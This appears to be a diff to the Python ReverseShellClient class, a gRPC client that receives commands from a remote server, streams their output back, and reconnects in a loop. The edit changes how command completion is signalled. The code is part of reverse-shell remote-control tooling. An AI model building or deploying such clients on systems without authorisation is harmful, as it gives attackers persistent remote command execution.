@@ -39,16 +39,23 @@ class ReverseShellClient:
                                 async for _ in self.stub.StreamResponses(iter([response])):
                                     logging.info(f"Sent command output to server for command: {command}")
 
-                        if not command_request.is_active:
+                            # After command execution is complete, send the final response with is_active=False
+                            final_response = reverse_shell_pb2.CommandResponse(
+                                request_id=command_request.request_id,
+                                output="",
+                                is_active=False
+                            )
+                            await self.stub.StreamResponses(iter([final_response]))
                             logging.info("Command processing finished.")
-                            break
-
+                        else:
+                            logging.info("No command received; waiting for the next command.")
             except grpc.RpcError as e:
                 logging.error(f"Error in receiving commands: {e.details()}")
                 self.connected = False
             except Exception as e:
                 logging.error(f"Unexpected error: {str(e)}")
             await asyncio.sleep(5)  # Retry after delay if disconnected
+
 
     async def connect_to_server(self):
         # Wait for the channel to be ready
